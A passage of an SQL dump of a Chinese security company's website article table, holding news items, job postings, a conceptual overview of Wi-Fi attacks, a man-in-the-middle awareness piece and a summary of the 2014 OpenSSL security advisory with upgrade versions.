2em;\">在此次系统安全建设改造中，院内技术人员、厂商与海峡信息共同查找安全隐患和漏洞，并组织力量进行深入分析，加强了系统防攻击和入侵的能力，提升了信息网络使用水平，强化了信息系统安全，进一步明确了信息安全责任。通过对发现问题的全面整改，对现有信息系统的各项安全措施进行了优化与调整，对有关技术标准和管理规范进行了完善与补充，对信息系统的各项规章制度进行了整合与更新，为今后的业务系统信息安全体系建设打下了坚实的基础。</p><p style=\"white-space: normal; text-indent: 2em;\"><span style=\"text-indent: 2em;\">海峡信息自1996年进入信息安全领域，经过近20年专业安全服务的执着实践，形成了完善的等级保护安全服务方法论。自2010年以来，海峡信息已陆续协助福建省检察院、福建省财政厅、福建省医科大学附属第一医院、福建省立医院……..顺利通过等级保护三级测评，工程服务团队及安全服务团队在项目中积累了大量经验，同时在行业内树立了良好的形象和服务品牌，获得了众多客户的认可。</span></p><p style=\"text-indent: 2em;\"><span style=\"text-indent: 2em;\">未来，</span><span style=\"text-indent: 2em;\">海峡信息也将积极面对新的形势和挑战，积极协助福建省重要信息信息等级保护工作，助力国家重要信息系统等级保护等相关规范在福建的落地，为福建省重要信息系统安全保障及构建贡献力量。</span></p><p><br/></p>','近期，福建省海峡信息助力漳州市医院，帮助其顺利通过等级保护三级测评，成为漳州市医疗行业之中首家通过等级保护三级测评的机构。\r\n海峡信息助力漳州市医院\r\n    漳州市医院信息系统等级保护（三级）项目依始，海峡信息成立项目组，组织安全专家团队依据国家标准GB/T 22239-2008《信息系统安全等级保护基本要求》、《卫生部办公厅关于全面开展卫生行业信息安全等级保护工作的通知》、《福建省医院信息系统安全等级保护工作实施方案》《福建省卫计委办公室关于进一步落实信息系统安全防护措施的通知》等相关文件对漳州市医院','1496300335','1498523726','202','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('64','警惕针对Wifi的五大无线攻击','','','','','','/uploads/img1/20170602/5930b3d5765c1.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">随着城市信息化进程的加速，3G、4G和无线网络已经越来越普及，用户可以在公司、商场、咖啡厅享受速度越来越快、使用越来越方便的Wifi网络。然而，大家是否知道，使用这些Wifi是否存在某些安全风险，而这些风险又会导致我们的信息或者财产损失呢?</p><p style=\"text-indent: 2em;\">由于WiFi主要是工作在OSI协议栈的第二层，大部分的攻击发生在第二层。但无线攻击，如干扰，也可以发生在第一层。在文中，我们描述了五种类型的无线攻击，供广大用户和企业安全管理人员们参考和提前预防。</p><p><span style=\"font-size: 16px; font-style: italic; font-weight: bold; line-height: 18px;\">有线侧漏</span></p><p style=\"text-indent: 2em;\">网络攻击(无论在有线或无线网络中)通常开始于某种形式的侦察。在无线网络中，侦察涉及使用无线嗅探器混听无线数据包，以使攻击者可以开始开发无线 网络的信号覆盖区。我们将重点放在第二层的数据包，因此我们没有连接(关联)到一个接入点。如果攻击者与一个接入点相关联，则他或她能够嗅探第三层及以 上。</p><p style=\"text-indent: 2em;\">由于协议如NetBIOS、OSPF、和HSRP，其中，其它协议因为预期仅用于保护内部网络而被设计为在它们的拓扑信息上具有说服力，广播和多播 通信在大多数有线网络上横行。许多管理者不知道的是，如果没有适当的分段和防火墙，当他们将无线网络连接到有线网络时，这种广播和多播通信会泄漏到无线空 间。多数接入点和无线开关允许流量无堵塞的泄漏到空间中。使用通过有线网络连接到AP并将内部协议通信泄漏到无线电波的网络设备说明了这个概念。不幸的 是，这个传输可能揭示网络的拓扑结构、设备类型、用户名、甚至是密码!</p><p style=\"text-indent: 2em;\">例如，思科用于网关故障转移的热备份路由协议(HSRP)发送多播数据包。默认情况下，这些数据包来回广播心跳消息，包括明文的热备份路由器密码。当这些数据包从有线空域泄漏到无线空域时，它们揭示了网络拓扑信息以及密码。</p><p style=\"text-indent: 2em;\">当部署无线时，你需要确保，比如一个防火墙，入口以及出口都被考虑到。在无线交换机和接入点的输出流量应适当过滤掉广播流量来防止这个敏感的有线流 量泄漏到本地空域。一个无线入侵防御系统(IPS)可以通过监测数据包泄漏迹象来识别这个有线侧漏，使管理员可以阻止任何在接入点、无线交换机、防火墙之 处的泄漏。</p><p><span style=\"font-size: 16px; font-style: italic; font-weight: bold; line-height: 18px;\">流氓接入点</span></p><p style=\"text-indent: 2em;\">流氓接入点的最常见的类型包括将像Linksys路由器等的消费级接入点带入办公室的用户。许多组织试图通过无线评估检测流氓AP。需要注意的是， 虽然你可能会发现在您附近的接入点，验证它们是否连接到你的物理网络也是同等重要的。流氓AP的定义是一个未经授权的无线接入点连接到你的网络。任何其它 的可见的不属于你的AP就是一个简单的相邻接入点。</p><p style=\"text-indent: 2em;\">审查潜在的流氓AP需要一些关于合法无线环境和认可的接入点的先验知识。该种用于检测流氓AP的方法涉及到环境中的异常访问点的确定，并因此真的是 一个最省力的方法。正如前面提到的，这种方法不一定需要确认接入点是否物理上连接到你的网络。那还需要评估有线的一面，然后将有线评估与无线评估关联起 来。否则，你唯一的其它选择是检查每个物理接入点来确定异常的AP是否连接到你的网络。这样做，对于大的评估来说是不切实际的。出于这个原因，无线IPS 在检测流氓AP上更有效。一个无线IPS将其通过无线传感器缩减到的与其在有线一侧看到的关联起来。通过各种算法，它决定一个接入点是否是一个真正的流氓 接入点，一个在物理上连接到网络的接入点。</p><p>甚至是季度性的流氓接入点抽查仍然给恶意黑客巨大的机会，为一些人留出不是几天就是几个月的时间插入流氓接入点、执行攻击、然后删除它而不被发现。</p><p><span style=\"font-size: 16px; font-style: italic; font-weight: bold; line-height: 18px;\">错误配置接入点</span></p><p style=\"text-indent: 2em;\">企业无线局域网的部署可能出现配置错误。人类的错误加上不同管理员安装接入点和开关可能导致多种配置错误。例如，一个未保存的配置变化可能容许一个 设备在停电重启时恢复到出厂默认设置。并且许多其它的配置错误会导致过多的漏洞。因此，这些设备必须进行符合你的政策的配置监测。一些这样的监测可以在布 线侧与WLAN管理产品一起实施。此外，如果你在无线IPS中预先定义政策以监测与政策不兼容的设备，成熟的无线IPS产品还可以监视错误配置的接入点。</p><p>现代的系统有不同的考虑——基于控制器的方法在很大程度上避免了这个为题，但一些组织，特别是一些较小的组织，仍将面临这样的问题。在控制器方面，人为的错误带来更大和更重大的风险——所有接入点都会有问题或有配置漏洞，而不只是一个。</p><p><span style=\"font-size: 16px; font-style: italic; font-weight: bold; line-height: 18px;\">无线钓鱼</span></p><p style=\"text-indent: 2em;\">因为组织机构在加强他们的无线网络方面变得更自律，趋势表明无线用户已经成为低悬的果实。当涉及到人类行为时，执行安全Wi-Fi使用是困难的。普 通的无线用户根本不熟悉在当地的咖啡店或机场连接到开放的Wi-Fi网络的威胁。此外，用户可以在不知情的情况下连接到他们认为是合法接入点的无线网络， 但实际上，是为特别是吸引不知情的受害者设立的蜜罐或开放网络。</p><p>例如，他们可能在家里有一个被称为“Linksys”的网络。因此，他们的笔记本电脑会自动连接到其它任何称为“Linksys”的网络。这种内置行为可能会导致偶然关联到一个恶意的无线网路，通常被称为无线网络钓鱼。</p><p>一旦攻击者获得对用户笔记本电脑的访问权限，则其不仅可以窃取敏感文件等的信息，还可以获得作为企业网络用户的无线网络凭据。这种攻击可能比直接攻 击企业网络更容易执行。如果攻击者可以从一个无线用户获得证书，然后他或她可以使用这些凭据来访问企业无线网络，绕过任何用于阻止更复杂攻击的加密和安全 机制。</p><p><span style=\"font-size: 16px; font-style: italic; font-weight: bold; line-height: 18px;\">客户端隔离</span></p><p style=\"text-indent: 2em;\">用户通常最容易成为攻击者的目标，特别是当它涉及到Wi-Fi时。当用户与接入点关联，他们可以看到其他试图连接到接入点的人。理想的情况是，大多数用户连接到接入点以获取互联网访问或访问公司网络，但他们在相同的无线网络中成为恶意用户的受害者。</p><p>除了窃听，恶意用户还可能直接定位到其他用户，只要他们被关联到相同的接入点。具体来说，一旦用户认证并关联到一个接入点，他或她便获取到一个IP 地址，并因此访问到第三层。与有线网络很相似，恶意无线用户现在与其他接入到该接入点的用户在同一个网络中，将他们作为直接的攻击目标。</p><p>无线技术供应商也意识到了这一漏洞，并已经发布了产品特点为客户和公司网络提供客户端隔离。基本上，客户端隔离允许人们访问接入点提供的互联网和其 他资源，减少了局域网的能力。当固定Wi-Fi网络时，隔离是必要的。通常该功能是默认被禁用的，所以确保它被所有的接入点启用。</p><p><br/></p>','随着城市信息化进程的加速，3G、4G和无线网络已经越来越普及，用户可以在公司、商场、咖啡厅享受速度越来越快、使用越来越方便的Wifi网络。然而，大家是否知道，使用这些Wifi是否存在某些安全风险，而这些风险又会导致我们的信息或者财产损失呢?\r\n\r\n由于WiFi主要是工作在OSI协议栈的第二层，大部分的攻击发生在第二层。但无线攻击，如干扰，也可以发生在第一层。在文中，我们描述了五种类型的无线攻击，供广大用户和企业安全管理人员们参考和提前预防。\r\n\r\n有线侧漏\r\n\r\n网络攻击(无论在有线或无线网络中)通常开始','1496300457','1498524219','116','41','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('26','高级安全顾问 2 名','','','','','','','<p>岗位职责<br/>&nbsp;从事专业信息安全咨询和服务工作，包括风险评估，安全体系设计，安全策略与制度设计，安全培训等；<br/>&nbsp;从事行业用户安全解决方案设计及项目管理工作；<br/>任职要求<br/>&nbsp;热衷于信息安全相关工作，有强烈的责任心和工作热情；<br/>&nbsp;具有良好的沟通能力和书面表达能力，具有良好的团队协作精神；<br/>&nbsp;熟悉主流安全技术，熟悉国内外主流安全产品，有大型信息安全项目或安全集成从业背景；<br/>&nbsp;熟悉ISO27001，17799，国家信息安全等级保护等标准，熟悉企业信息安全策略和安全体系结构；&nbsp;<br/>&nbsp;三年以上信息安全相关工作经验，有信息系统风险评估项目或IT咨询实施经验；<br/>&nbsp;有CISSP，CISP、BS7799LA等相关证书者优先；</p>','岗位职责? 从事专业信息安全咨询和服务工作，包括风险评估，安全体系设计，安全策略与制度设计，安全培训等；? 从事行业用户安全解决方案设计及项目管理工作；任职要求? 热衷于信息安全相关工作，有强烈的责任心和工作热情；? 具有良好的沟通能力和书','1492585686','1498705407','96','58','1','0','','1','0','1');
INSERT INTO `xyh_article` VALUES ('49','安全科普：什么是中间人攻击（MITM）','','','','','','','<p style=\"text-indent: 2em;\">你拿着刚买的咖啡，连上了咖啡店的WiFi，然后开始工作，这样的动作在之前已经重复了无数遍，一切都和谐无比。但你不知道的是有人正在监视你，他们监视着你的各种网络活动，盗取你的银行凭证，家庭住址，个人电子邮件和联系人，当你发现的时候，已经晚了。</p><p><br/></p><p style=\"text-align:center\"><img src=\"http://www.si.net.cn/Upimg/201493011823173.jpg\"/></p><p style=\"text-indent: 2em;\">现在的小偷已经不仅仅是简单的在地铁上偷你的钱包，更高级的是使用网络攻击获取你的各种信息，当你在咖啡馆上网检查你的账户信息的时候，也许黑客就拦截了你电脑和WiFi之间的通信，监视着你的一举一动。这种方法就是“中间人攻击”(MITM)，而这种攻击还仅仅是黑客用于攻击你的众多方法之一。</p><p style=\"text-indent: 2em;\">许多黑客都是利用网络漏洞使得自己能够很清晰的看见用户的各种数据。即使普遍受大众信赖的公司网络也会存在漏洞。去年三月，有公司就被曝光黑客获取 了客户的信用卡资料，社保号码，家庭住址，电话号码等个人信息。苹果公司最近的gotofail漏洞以及安卓VPN缺陷都在提醒着我们：即使是主流的操作 系统也有可能把你置于危险的情况中。</p><h3>中间人攻击的案例</h3><p style=\"text-indent: 2em;\">前段时间的https爆出“心脏出血”事件可能是目前讨论最热烈的OpenSSL漏洞。消息曝光称攻击者可以追踪OpenSSL所分配的64KB缓 存，将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容如密码，信用卡信息和服务器的私钥等就会以每次64KB的速度进行 泄露。“心脏出血”漏洞影响了百分之66的互联网用户，包括一些主流网站如雅虎，Flickr, Pinterest等等。这个漏洞使得MITM更加危险。即使HTTPS已经开启，但是攻击者可以用盗来的证书获取有价值的数据，基本使你处于毫无防备的 状态。</p><p style=\"text-indent: 2em;\">虽然像OpenSSL的“心脏出血”漏洞以及苹果gotofail漏洞使得攻击者很轻易能够获得各种数据，但是大多数情况下，高级黑客还是会使用其他的手段。例如，一些攻击者会通过SSL剥离删除你的数据加密，用不安全的HTTP取代所有安全的HTTPS。其他方法如制造用户方的漏洞，通过浏览器来渗入用户的设备。在这两种情况下，一旦攻击者利用这个漏洞，他就能看到你的设备和接受者之间发送的所有数据，包括用户名和密码。</p><p style=\"text-indent: 2em;\">即使像“心脏出血”之类的漏洞已经被修补，由于操作系统工作的基本性质，MITM的威胁仍然存在。这是因为攻击技术模拟了正常的网络协议，所以如果 操作系统厂商试图阻止MITM攻击,他们需要打破设备连接到合法网络的方式，而这样做就使得问题变得更加糟糕。我很遗憾的告诉你，所有基于Ip的设备都存 在MITM能够找得到的漏洞。</p><p style=\"text-indent: 2em;\">随着今年年底之前手机数量即将超过地球人口数量，毫无疑问手机将成为下一波黑客攻击的前沿地带。除了设备的数量，员工在企业私人安全网络之外的消费 预计在2017年形成爆炸形势，据估计所有移动数据流量的60%将转移到公共网络，这种不安全的公共网络的转变将导致MITM数量的明显增加。因此，很多 人转向通过安装杀毒软件来保护自己的移动设备。但是杀毒软件并不适合移动架构，这种解决方案如果没有root权限访问设备的操作系统的话，也是不能够监控 设备的活动情况。而且传统个人电脑的安全方法将对移动设备产生不必要的影响：操作系统变慢，电池消耗更快，且占用更多的内存空间等。此外，杀毒软件没有能 力发现网络检测以及类似于MITM之类的行为，而是去寻找已知的恶意签名。</p><h3>如何避免MITM</h3><p style=\"text-indent: 2em;\">个人和组织都可以使用各种方法来保护自己的设备和网络安全，让人惊讶的是，许多主流网站最近在才开始对他们的服务进行加密。假设网站的URL读取的 是“HTTP”而不是“HTTPS”，黑客就可以随时监视你的账户信息，所以如果网站没有加密的话，自己动手完整整个协议，输入包括“HTTPS”在内的 完整的网址，尤其是在填写表格的时候。这一招虽然不能保护你免受高级黑客的攻击，但是对于一些比较菜的黑客还是有用的。在默认情况下，一些常用的服务不会 执行SSL，这使得黑客有机可乘，完全接管了这些账户。</p><p style=\"text-indent: 2em;\">启用虚拟专用网(VPN)是另一种解决方案，在某些情况下也可以起到保护的作用，VPN是架构在公用网络服务商所提供的网络平台之上的逻辑网络，用 户数据在逻辑链路中传输可以起到信息安全保护的作用。但是这种方法有一些限制。鉴于VPN是通过建立“安全通道”来实现，这种方法无法保护在公共WiFi 下使用网络的移动设备</p><p style=\"text-indent: 2em;\">为了给一些敏感数据提供最佳保护，个人和组织需要发展一种全面地移动安全解决方案。虽然目前在合法网络情况下传统个人电脑的安全已经得到保障，但是 这些组织应该在不影响用户体验感的基础上，为移动设备提供终端保护，保护这些设备可能遇到的各种不可控网络。但是要注意，移动安全空间非常的吵杂。虽然很 多公司都声称可以保护你的手机，但是很少能够真正的做到保护你的银行帐号和个人信息免受网络的攻击。当前最流行的杀毒软件甚至不能保护你免于最业余的攻击。所以除非我们工作的地方，爱去的网站转变他们移动安全的方法，采取必要的措施来保护他们的网络，否则自我保护免于黑客攻击的责任就落在了我们自己的身上，也许咖啡馆里坐你隔壁喝着卡布奇诺的那个家伙就正在盗取你的信息。</p>','你拿着刚买的咖啡，连上了咖啡店的WiFi，然后开始工作，这样的动作在之前已经重复了无数遍，一切都和谐无比。但你不知道的是有人正在监视你，他们监视着你的各种网络活动，盗取你的银行凭证，家庭住址，个人电子邮件和联系人，当你发现的时候，已经晚了。\r\n\r\n\r\n 现在的小偷已经不仅仅是简单的在地铁上偷你的钱包，更高级的是使用网络攻击获取你的各种信息，当你在咖啡馆上网检查你的账户信息的时候，也许黑客就拦截了你电脑和WiFi之间的通信，监视着你的一举一动。这种方法就是“中间人攻击”(MITM)，而这种攻击还仅仅是黑客用','1493110562','1498525282','73','41','1','0','','0','0','1');
INSERT INTO `xyh_article` VALUES ('50','OpenSSL再爆多处高危漏洞','','','','','','/uploads/img1/20170426/58fff6f5efcc2.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">OpenSSL团队于北京时间6月5号晚8点左右发布了5个安全补丁，这次的更新涉及多处高危漏洞，连接：http://www.openssl.org/news/</p><p style=\"text-indent: 2em;\">相关漏洞详情：</p><p style=\"text-indent: 2em;\">http://www.openssl.org/news/secadv_20140605.txt</p><p style=\"text-indent: 2em;\">其中一个漏洞CVE-2014-0195将导致任意代码执行，该漏洞影响DTLS客户端或服务端</p><p style=\"text-indent: 2em;\">CVE-2014-0224：中间人欺骗(MITM)漏洞，影响客户端（全版本）和服务端（1.0.1 and 1.0.2-beta1)</p><p style=\"text-indent: 2em;\">建议：</p><p style=\"text-indent: 2em;\">OpenSSL 0.9.8 SSL/TLS users (client and/or server) 请更新到 0.9.8za.</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.0 SSL/TLS users (client and/or server) 请更新到 1.0.0m.</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.1 SSL/TLS users (client and/or server) 请更新到 1.0.1h.</p><p style=\"text-indent: 2em;\">CVE-2014-0221：拒绝服务漏洞，攻击者可通过发送一个恶意的DTLS握手包，导致拒绝服务</p><p style=\"text-indent: 2em;\">建议：</p><p style=\"text-indent: 2em;\">OpenSSL 0.9.8 DTLS用户请更新到0.9.8za</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.0 DTLS用户请更新到1.0.0m.</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.1 DTLS用户请更新到1.0.1h.</p><p style=\"text-indent: 2em;\">CVE-2014-0195：任意代码执行漏洞，攻击者可发送一个恶意的DTLS fragmetns到OpenSSL DTLS客户端或服务端，将能够在存在漏洞的客户端或服务端引起任意代码执行</p><p style=\"text-indent: 2em;\">建议：</p><p style=\"text-indent: 2em;\">OpenSSL 0.9.8 DTLS 用户请更新到 0.9.8za</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.0 DTLS 用户请更新到 1.0.0m.</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.1 DTLS 用户请更新到 1.0.1h.</p><p style=\"text-indent: 2em;\">CVE-2014-0198：拒绝服务漏洞，do_ssl3_write()函数允许远程用户通过一个空指针引用，这个漏洞仅仅影响OpenSSL 1.0.0和1.0.1当SSL_MODE_RELEASE_BUFFERS开启的环境（非默认选项）</p><p style=\"text-indent: 2em;\">建议:</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.0 用户请更新到 1.0.0m.</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.1 用户请更新到 1.0.1h.</p><p style=\"text-indent: 2em;\">&nbsp;</p><p style=\"text-indent: 2em;\">CVE-2010-5298：会话注入&amp;拒绝服务漏洞，攻击者利用ssl3_read_bytes 函数的竞争机制可以在会话之间注入数据或者使服务端拒绝服务。</p><p style=\"text-indent: 2em;\">此漏洞仅影响使用OpenSSL1.0.0多线程应用程序</p><p style=\"text-indent: 2em;\">和1.0.1，其中SSL_MODE_RELEASE_BUFFERS被启用（不常见，并非默认设置）</p><p style=\"text-indent: 2em;\">CVE-2014-3470：拒绝服务漏洞，当OpenSSL TLS客户端启用匿名ECDH密码套件可能导致拒绝服务攻击。</p><p style=\"text-indent: 2em;\">建议:</p><p style=\"text-indent: 2em;\">OpenSSL 0.9.8 用户请更新到 0.9.8za</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.0 用户请更新到 1.0.0m.</p><p style=\"text-indent: 2em;\">OpenSSL 1.0.1 用户请更新到 1.0.1h.</p><p><br/></p>','OpenSSL团队于北京时间6月5号晚8点左右发布了5个安全补丁，这次的更新涉及多处高危漏洞，连接：http://www.openssl.org/news/\r\n\r\n相关漏洞详情：\r\nhttp://www.openssl.org/news/secadv_20140605.txt\r\n其中一个漏洞CVE-2014-0195将导致任意代码执行，该漏洞影响DTLS客户端或服务端\r\nCVE-2014-0224：中间人欺骗(MITM)漏洞，影响客户端（全版本）和服务端（1.0.1 and 1.0.2-beta1)\r\n建','1493110575','1498525069','49','41','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('65','高级安全顾问 2 名','','','','','','','<p><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;岗位职责</strong><br/>从事专业信息安全咨询和服务工作，包括风险评估，安全体系设计，安全策略与制度设计，安全培训等；<br/>从事行业用户安全解决方案设计及项目管理工作；<br/><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;任职要求</strong><br/>热衷于信息安全相关工作，有强烈的责任心和工作热情；<br/>具有良好的沟通能力和书面表达能力，具有良好的团队协作精神；<br/>熟悉主流安全技术，熟悉国内外主流安全产品，有大型信息安全项目或安全集成从业背景；<br/>熟悉ISO27001，17799，国家信息安全等级保护等标准，熟悉企业信息安全策略和安全体系结构；&nbsp;<br/>三年以上信息安全相关工作经验，有信息系统风险评估项目或IT咨询实施经验；<br/>有CISSP，CISP、BS7799LA等相关证书者优先；</p><p style=\"white-space: normal;\"><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;</strong><strong>联系方式</strong>&nbsp;</p><p style=\"white-space: normal;\">联系地址：福州市北环中路61号海峡信息大楼2F</p><p style=\"white-space: normal;\">联系电话：0591-87303710</p><p style=\"white-space: normal;\">联 系 人：张先生</p><p style=\"white-space: normal;\">电子邮箱：hxzhb@heidun.net</p>','岗位职责从事专业信息安全咨询和服务工作，包括风险评估，安全体系设计，安全策略与制度设计，安全培训等；从事行业用户安全解决方案设计及项目管理工作；任职要求热衷于信息安全相关工作，有强烈的责任心和工作热情；具有良好的沟通能力和书面表达能力，具有','1498705450','1498894145','10','58','1','0','','0','0','1');
INSERT INTO `xyh_article` VALUES ('66','安全顾问 3名','','','','','','','<p><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;岗位职责</strong><br/>对于相关技术领域进行安全服务实施并完成实施报告；<br/>对专项安全解决方案进行技术支持。<br/><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;任职要求</strong><br/>热衷于信息安全领域工作，较强的动手能力；<br/>对Windows、Unix、SQL Server、Oracle等系统有较深入的了解，熟悉TCP/IP协议、漏洞扫描、网络攻防等网络安全技术；<br/>良好的沟通能力和书面表达能力，能够完成客户培训和评估报告；<br/>敬业、正直、诚实，有强烈的责任心和工作热情；<br/>计算机及相关专业本科以上学历；<br/>获得CISSP,CISP,CCNP等相关认证证书，有实践经验者优先。</p><p style=\"white-space: normal;\"><strong><img src=\"/uploads/img1/20170701/59571d5512d8c.png\" title=\"59571d5512d8c.png\" alt=\"zarror.png\"/>&nbsp;</strong><strong>联系方式</strong>&nbsp;</p><p style=\"white-space: normal;\">联系地址：福州市北环中路61号海峡信息大楼2F</p><p style=\"white-space: normal;\">联系电话：0591-87303710</p><p style=\"white-space: normal;\">联 系 人：张先生</p><p style=\"white-space: normal;\">电子邮箱：hxzhb@heidun.net</p>','岗位职责对于相关技术领域进行安全服务实施并完成实施报告；对专项安全解决方案进行技术支持。任职要求热衷于信息安全领域工作，较强的动手能力；对Windows、Unix、SQL Server、Oracle等系统有较深入的了解，熟悉TCP/IP协议','1498705474','1498891750','62','58','1','0','','0','0','1');
INSERT INTO `xyh_article` VALUES ('51','海峡信息发布“2015年度互联网安全态势分析报告”','','','','','','/uploads/img1/20170426/58fff6a66e705.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">目前，我国网络安全形势依然严峻。在基础网络领域，国家互联网应急中心的数据显示，今年上半年，我国境内近943万个IP地址对应的主机被木马或僵尸程序控制，这一数字比去年同期增长了50.6%；被植入后门的政府网站数量达2046个，比去年同期增长了137.4%；仿冒境内网站的页面数量达89097个，已经接近2014年全年数量。</p><p style=\"text-indent: 2em;\">鉴于此，福建省海峡信息技术有限公司（以下简称“海峡信息”）期望通过研究福建省内安全漏洞情况，了解我省信息安全状况及各行业安全风险。</p><p>本报告数据样本来自2015年1月1日-2015年12月31日海峡信息漏洞跟踪平台中的福建省漏洞安全数据，采取全量样本进行分析。海峡信息漏洞跟踪平台所采集数据来自于国内外各大漏洞发布平台，如乌云、补天、反动黑客联盟等。</p><p><br/></p>',' 目前，我国网络安全形势依然严峻。在基础网络领域，国家互联网应急中心的数据显示，今年上半年，我国境内近943万个IP地址对应的主机被木马或僵尸程序控制，这一数字比去年同期增长了50.6%；被植入后门的政府网站数量达2046个，比去年同期增长了137.4%；仿冒境内网站的页面数量达89097个，已经接近2014年全年数量。\r\n      鉴于此，福建省海峡信息技术有限公司（以下简称“海峡信息”）期望通过研究福建省内安全漏洞情况，了解我省信息安全状况及各行业安全风险。\r\n      本报告数据样本来自2015','1493110632','1498524112','56','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('52','公司成功协办“福建省计算机教育实验教学研讨会”','','','','','','/uploads/img1/20170426/58fff66d03f0c.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">2016年5月13日-15日，以“云计算时代的计算机实验教学”为主题的福建省计算机教育实验教学研讨会在福建龙岩学院召开，此次会议由福建省计算机学会主办，福建省海峡信息技术有限公司协办，会议邀请国家级实验教学示范中心联席会计算机学科组组长、清华大学计算机系杨士强教授、福州大学数计院副院长林世平、福建省教育厅职教中心主任游金水以及高校计算机专业负责人、一线教师等70多名嘉宾参加。会议围绕“计算机实验教学”主题展开讨论，与会的高校计算机实验教学建设领域专家和代表们积极分享了近年来取得的经验成果，现场氛围十分活跃。</p><p style=\"text-indent: 2em;\">研讨会上，我司资深教育行业工程师针对网络安全实验教学领域进行了深入沟通和交流，海峡信息网络安全实训室解决方案、网络安全虚拟仿真实验室解决方案、校企合作共建实验室方案得到了多方的关注。此次研讨会的顺利召开，不仅为各高校探讨信息安全人才培养以及实验室教学先进经验提供交流平台，同时也促进了各信息领域专家与企业、院校的紧密联系，为我司在高校网络安全实验室教学领域的发展奠定了坚实的基础。</p><p><br/></p>','2016年5月13日-15日，以“云计算时代的计算机实验教学”为主题的福建省计算机教育实验教学研讨会在福建龙岩学院召开，此次会议由福建省计算机学会主办，福建省海峡信息技术有限公司协办，会议邀请国家级实验教学示范中心联席会计算机学科组组长、清华大学计算机系杨士强教授、福州大学数计院副院长林世平、福建省教育厅职教中心主任游金水以及高校计算机专业负责人、一线教师等70多名嘉宾参加。会议围绕“计算机实验教学”主题展开讨论，与会的高校计算机实验教学建设领域专家和代表们积极分享了近年来取得的经验成果，现场氛围十分活跃','1493110645','1498524093','31','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('53','公司项目荣获“2015年度福建省科学技术进步奖三等奖”','','','','','','/uploads/img1/20170426/58fff29c4f0e8.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">近日，省政府发布关于“2015年福建省科学技术奖励和专利奖励”的决定， 经福建省科学技术奖励委员会严格评审，福建省海峡信息技术有限公司开发的“数据库安全监管综合平台”项目荣获“2015年度福建省科学技术进步奖三等奖”。</p><p style=\"text-indent: 2em;\">黑盾数据库安全监管综合平台采用优良的体系结构，以网络审计为主，兼容数据库本地审计的方式，实现对数据库的查询、新增、删除、修改、授权等各种操作行为进行解析和智能关联，并提供多种灵活方便的查询方法、统计报表，供数据管理者查询、分析、决策功能；此外，该系统还具有高效的数据库入侵防御功能，对恶意攻击或者误操作等敏感行为进行实时报警或阻断，支持ORACLE、 SQL Server、 Sybase 等数据库超大容量的数据库审计条目，广泛适用于金融、证券、保险、电力、政务、卫生、教育等大中型组织数据库审计的安全需求。</p><p style=\"text-indent: 2em;\">未来，海峡信息将珍惜荣誉，再接再励，充分发挥科技创新的模范带头作用，勇攀高峰，再创佳绩。</p><p><br/></p>','近日，省政府发布关于“2015年福建省科学技术奖励和专利奖励”的决定， 经福建省科学技术奖励委员会严格评审，福建省海峡信息技术有限公司开发的“数据库安全监管综合平台”项目荣获“2015年度福建省科学技术进步奖三等奖”。\r\n       黑盾数据库安全监管综合平台采用优良的体系结构，以网络审计为主，兼容数据库本地审计的方式，实现对数据库的查询、新增、删除、修改、授权等各种操作行为进行解析和智能关联，并提供多种灵活方便的查询方法、统计报表，供数据管理者查询、分析、决策功能；此外，该系统还具有高效的数据库入侵防','1493110657','1498524063','54','18','1','1','','0','0','1');
INSERT INTO `xyh_article` VALUES ('54','公司协办“三明市中小学网络安全管理培训会','','','','','','/uploads/img1/20170426/58fff1f1f260a.jpg!300X300.jpg','<p style=\"text-indent: 2em;\">由福建省三明市教育局、三明市公安局网安支队主办，公司协办的“三明市中小学网络安全管理培训会”于7月13日在三明市翰博大酒店召开，三明市各县市教育局信息中心主管、网管老师等近150人参加会议。</p><p style=\"text-indent: 2em;\">本次会议旨在对三明教育系统网络安全相关负责人开展网络安全意识、等级保护安全建设能力普及培训，公司先后汇报了《三明教育系统信息安全意识培训》、《教育局数据中心等级保护培训》、《三明教育系统网站安全威胁应对》、《教育城域网集中管理解决方案》等专题内容，针对网络安全、网站安全建设与维护、教育城域网集中建设等进行了深入的沟通与交流，围绕数字化校园、教育城域网、三通两平台建设方面分析了教育行业信息化的安全问题，公司提出的教育局数据中心等级保护解决方案、教育城域网集中管理解决方案、中小学网站群集中建设方案等，得到了参会领导的高度关注和认可，现场氛围十分活跃。</p><p style=\"text-indent: 2em;\">海峡信息认为，教育信息化目前发展相对成熟，但是信息安全、运维困惑、合规性要求是教育信息化所需面对的新问题、新挑战。作为福建信息安全领域的领军企业，海峡信息也将继续为三明教育信息化保驾护航。</p><p><br/></p>',' 由福建省三明市教育局、三明市公安局网安支队主办，公司协办的“三明市中小学网络安全管理培训会”于7月13日在三明市翰博大酒店召开，三明市各县市教育局信息中心主管、网管老师等近150人参加会议。\r\n      